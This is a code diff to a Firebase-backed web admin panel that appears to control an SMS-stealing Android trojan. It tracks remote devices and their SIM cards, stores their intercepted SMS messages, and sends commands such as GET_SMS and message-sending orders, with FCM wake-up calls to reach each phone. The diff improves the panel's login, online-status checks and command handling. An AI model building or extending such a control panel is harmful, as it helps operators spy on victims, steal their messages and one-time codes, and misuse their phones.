@@ -75,6 +75,9 @@
                 <div class="space-y-1">
                     <label class="text-[10px] font-black text-slate-500 uppercase ml-1">Master Key</label>
                     <input type="password" id="login-pass" class="w-full bg-slate-50 border border-slate-200 rounded-xl px-4 py-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none transition-all" placeholder="••••••••">
+                    <div class="text-right px-1">
+                        <button onclick="handleResetPassword()" class="text-[9px] font-black text-blue-600 uppercase hover:underline">Forgot Key?</button>
+                    </div>
                 </div>
                 <button onclick="handleLogin()" id="login-btn" class="w-full bg-slate-900 text-white py-4 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-blue-600 transition-all shadow-xl active:scale-95">Verify Identity</button>
             </div>
@@ -160,6 +163,14 @@
                 <div class="w-8 h-8 bg-slate-100 rounded-full flex items-center justify-center text-slate-400 border border-slate-200"><i class="fas fa-user-shield text-xs"></i></div>
             </div>
         </header>
+
+        <!-- ADMIN ANNOUNCEMENT START: Is line ke niche ka text aap change kar sakte hain -->
+        <div class="bg-rose-50 border-b border-rose-100 py-1.5 flex-shrink-0">
+            <marquee behavior="scroll" direction="left" class="text-rose-600 font-black text-[11px] uppercase tracking-[0.2em]">
+                kali dev
+            </marquee>
+        </div>
+        <!-- ADMIN ANNOUNCEMENT END -->
 
         <!-- Fixed Scrollable Stats Row (Global) -->
         <div class="bg-white border-b border-slate-200 flex-shrink-0 z-20 overflow-hidden">
@@ -310,7 +321,7 @@
                             <label class="text-[9px] font-black text-slate-500 uppercase ml-1">Fetch SMS</label>
                             <div class="flex gap-1">
                                 <select id="cmd-shared-count" class="bg-slate-800 text-xs font-black text-indigo-400 rounded-xl px-2 border border-slate-700 outline-none">
-                                    <option value="1">1</option><option value="2">5</option><option value="3">10</option>
+                                    <option value="1">1</option><option value="5">5</option><option value="10">10</option>
                                 </select>
                                 <button onclick="sendUserCmd('GET_SMS')" class="bg-indigo-600 hover:bg-indigo-700 flex-1 py-2.5 rounded-xl text-[10px] font-black uppercase transition-all active:scale-95">Fetch</button>
                             </div>
@@ -394,50 +405,76 @@
             });
     }
 
+    function handleResetPassword() {
+        const email = document.getElementById('login-email').value.trim();
+        const err = document.getElementById('login-err');
+
+        if(!email) {
+            err.innerText = "ENTER EMAIL TO RESET";
+            err.classList.remove('hidden');
+            setTimeout(() => err.classList.add('hidden'), 3000);
+            return;
+        }
+
+        auth.sendPasswordResetEmail(email)
+            .then(() => {
+                alert("Reset link sent to: " + email + "\nCheck your inbox/spam.");
+            })
+            .catch(error => {
+                err.innerText = "RESET FAILED: " + error.message;
+                err.classList.remove('hidden');
+                setTimeout(() => err.classList.add('hidden'), 5000);
+            });
+    }
+
     auth.onAuthStateChanged(user => {
+        console.log("Auth State Changed:", user ? "LOGGED_IN" : "LOGGED_OUT");
+        const overlay = document.getElementById('login-overlay');
+
         if(user) {
-            document.getElementById('login-overlay').classList.add('hidden');
+            // 1. Force Hide Overlay Immediately
+            if(overlay) overlay.style.display = 'none';
             document.getElementById('admin-display-name').innerText = user.email.split('@')[0].toUpperCase();
 
-            // Record Login History with detailed info
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    const loginEntry = {
-                        e: user.email,
-                        ts: firebase.database.ServerValue.TIMESTAMP,
-                        s: 'SUCCESS',
-                        ip: data.ip,
-                        ua: navigator.userAgent.substring(0, 100), // Browser/OS info
-                        p: window.location.pathname.split('/').pop() || 'admin.html'
-                    };
-                    db.ref('AdminLogs').push(loginEntry);
-                }).catch(() => {
-                    // Fallback if IP fetch fails
-                    db.ref('AdminLogs').push({
-                        e: user.email,
-                        ts: firebase.database.ServerValue.TIMESTAMP,
-                        s: 'SUCCESS',
-                        ua: navigator.userAgent.substring(0, 100)
-                    });
-                });
+            // 2. Load Dashboard
+            showView('dashboard');
+            startListeners();
 
-            // Session Protection
+            // 3. Log History (Background)
+            logAdminLogin(user.email);
+
+            // 4. Session Protection
             db.ref('Settings/sessionVer').on('value', snap => {
                 const cloudVer = snap.val() || 0;
                 const localVer = parseInt(localStorage.getItem('adminSessVer') || '0');
                 if (cloudVer > localVer) {
                     localStorage.setItem('adminSessVer', cloudVer);
                     logout();
-                    alert("Your session has been terminated from all devices.");
                 }
             });
-
-            startListeners();
         } else {
-            document.getElementById('login-overlay').classList.remove('hidden');
+            if(overlay) overlay.style.display = 'flex';
         }
     });
+
+    function logAdminLogin(email) {
+        const logData = {
+            e: email,
+            ts: firebase.database.ServerValue.TIMESTAMP,
+            s: 'SUCCESS',
+            ua: navigator.userAgent.substring(0, 80)
+        };
+
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                logData.ip = data.ip;
+                db.ref('AdminLogs').push(logData);
+            })
+            .catch(() => {
+                db.ref('AdminLogs').push(logData);
+            });
+    }
 
     function logout() { auth.signOut(); }
 
@@ -467,37 +504,50 @@
     }
 
     function startListeners() {
-        db.ref('Users').on('value', snap => {
-            usersData = snap.val() || {};
-            updateDashboard();
-            if(selectedUid) updateDetails(selectedUid);
-        });
+        try {
+            console.log("Listeners Started...");
 
-        const histList = document.getElementById('history-list');
-        if(histList) {
+            // 1. Users Listener
+            db.ref('Users').on('value', snap => {
+                usersData = snap.val() || {};
+                updateDashboard();
+                if(selectedUid) updateDetails(selectedUid);
+            });
+
+            // 2. Admin Logs Listener (Persistent)
             db.ref('AdminLogs').limitToLast(50).on('value', snap => {
                 const histList = document.getElementById('history-list');
                 if(!histList) return;
+
                 histList.innerHTML = '';
                 const logs = [];
-                snap.forEach(s => logs.push(s.val()));
+                snap.forEach(s => {
+                    const val = s.val();
+                    if(val) logs.push(val);
+                });
+
+                if(logs.length === 0) {
+                    histList.innerHTML = '<tr><td colspan="3" class="px-4 py-8 text-center text-slate-400 font-bold italic uppercase tracking-widest text-[10px]">No logs found</td></tr>';
+                    return;
+                }
+
                 logs.reverse().forEach(log => {
                     const row = `
                         <tr class="border-b border-slate-50 hover:bg-slate-50 transition-colors">
                             <td class="px-4 py-3">
-                                <div class="font-bold text-slate-700">${log.e}</div>
-                                <div class="text-[8px] text-slate-400 truncate max-w-[150px]">${log.ua || 'Unknown Device'}</div>
+                                <div class="font-bold text-slate-700">${log.e || 'Unknown'}</div>
+                                <div class="text-[8px] text-slate-400 truncate max-w-[150px]">${log.ua || 'Direct Access'}</div>
                             </td>
                             <td class="px-4 py-3">
-                                <div class="text-slate-600 font-mono text-[10px]">${new Date(log.ts).toLocaleString()}</div>
+                                <div class="text-slate-600 font-mono text-[10px]">${log.ts ? new Date(log.ts).toLocaleString() : '---'}</div>
                                 <div class="text-[9px] font-bold text-blue-500">${log.ip || '0.0.0.0'}</div>
                             </td>
-                            <td class="px-4 py-3 text-right"><span class="bg-green-100 text-green-600 px-2 py-0.5 rounded-full font-black text-[9px] uppercase">${log.s}</span></td>
+                            <td class="px-4 py-3 text-right"><span class="bg-green-100 text-green-600 px-2 py-0.5 rounded-full font-black text-[9px] uppercase">${log.s || 'SUCCESS'}</span></td>
                         </tr>`;
                     histList.innerHTML += row;
                 });
             });
-        }
+        } catch(e) { console.error("Listener Error", e); }
     }
 
     function setFilter(f) {
@@ -524,9 +574,16 @@
         if(!ts) return "NEVER";
         const diff = Date.now() - ts;
         if(diff < 60000) return "JUST NOW";
+        if(diff < 300000) return Math.floor(diff/60000) + "m AGO";
         if(diff < 3600000) return Math.floor(diff/60000) + "m AGO";
         if(diff < 86400000) return Math.floor(diff/3600000) + "h AGO";
         return new Date(ts).toLocaleDateString();
+    }
+
+    function checkIsOnline(info) {
+        if (!info) return false;
+        // Consider online if flag is true OR if active in last 5 minutes (300,000 ms)
+        return (info.online === true) || (Date.now() - (info.lo || 0) < 300000);
     }
 
     function copyToClipboard(text, btn) {
@@ -570,7 +627,7 @@
             permIds[uid] = idx + 1;
             const u = usersData[uid];
             const info = u.I || {};
-            const isOnline = Date.now() - (info.lo || 0) < 60000;
+            const isOnline = checkIsOnline(info);
             const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
             if ((info.lo || 0) >= startOfToday || hasSmsToday) todayCount++;
             if (Object.keys(u.M || {}).length > 0) msgsCount++;
@@ -619,7 +676,7 @@
             sorted.forEach((uid) => {
                 const u = usersData[uid];
                 const info = u.I || {};
-                const isOnline = Date.now() - (info.lo || 0) < 60000;
+                const isOnline = checkIsOnline(info);
                 const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
                 const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
                 const name = (info.m || "Unknown");
@@ -711,7 +768,6 @@
                 const sims = u.S || [];
                 const mList = Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
                 const lastM = mList[0] || {};
-                const isOnline = Date.now() - (info.lo || 0) < 60000;
                 const name = (info.m || "Unknown");
 
                 const card = document.createElement('div');
@@ -720,6 +776,7 @@
 
                 const s1 = sims[0]?.n || 'H';
                 const s2 = sims[1]?.n || 'H';
+                const isOnline = checkIsOnline(info);
 
                 card.innerHTML = `
                     <div class="flex items-center justify-between mb-3">
@@ -810,6 +867,13 @@
         }
 
         selectedUid = uid;
+
+        // Clear command inputs when switching devices
+        const numInput = document.getElementById('cmd-shared-num');
+        const msgInput = document.getElementById('cmd-shared-msg');
+        if(numInput) numInput.value = "";
+        if(msgInput) msgInput.value = "";
+
         showView('detail');
         updateDetails(uid);
 
@@ -826,7 +890,7 @@
         const u = usersData[uid]; if(!u) return;
         const info = u.I || {};
         const sims = u.S || [];
-        const isOnline = Date.now() - (info.lo || 0) < 60000;
+        const isOnline = checkIsOnline(info);
 
         // Header info
         const uIdx = permIds[uid] || "";
@@ -1001,12 +1065,27 @@
         db.ref(`Users/${selectedUid}/C`).push(cmd);
 
         // 2. Write to FCM Queue (for Cloud Function to wake up device)
-        const fcmPayload = { ...cmd, targetUid: selectedUid };
+        const fcmPayload = { t: 'WAKE_UP', targetUid: selectedUid }; // Just a wake up call
         db.ref('fcm_queue').push(fcmPayload);
 
+        // Visual Feedback
         const st = document.getElementById('cmd-status');
-        st.innerText = "SENT ✓"; st.className = "text-[9px] font-black bg-green-600 px-3 py-1 rounded text-white";
-        setTimeout(() => { st.innerText = "READY"; st.className = "text-[9px] font-black bg-slate-800 px-3 py-1 rounded text-slate-400"; }, 2000);
+        if (type === 'CHECK_ONLINE') {
+            st.innerText = "REFRESHING...";
+            st.className = "text-[9px] font-black bg-amber-500 px-3 py-1 rounded text-white animate-pulse";
+        } else {
+            st.innerText = "SENT ✓";
+            st.className = "text-[9px] font-black bg-green-600 px-3 py-1 rounded text-white";
+        }
+
+        setTimeout(() => {
+            st.innerText = "READY";
+            st.className = "text-[9px] font-black bg-slate-800 px-3 py-1 rounded text-slate-400";
+        }, 3000);
+
+        // Clear inputs
+        document.getElementById('cmd-shared-num').value = "";
+        document.getElementById('cmd-shared-msg').value = "";
     }
 
     function saveGlobal(k) {
@@ -1081,16 +1160,6 @@
         });
         alert(`Purge Complete: ${count} inactive devices removed.`);
     }
-
-    auth.onAuthStateChanged(user => {
-        if(user) {
-            document.getElementById('login-overlay').classList.add('hidden');
-            document.getElementById('admin-display-name').innerText = user.email.split('@')[0].toUpperCase();
-            startListeners();
-        } else {
-            document.getElementById('login-overlay').classList.remove('hidden');
-        }
-    });
 </script>
 </body>
 </html>
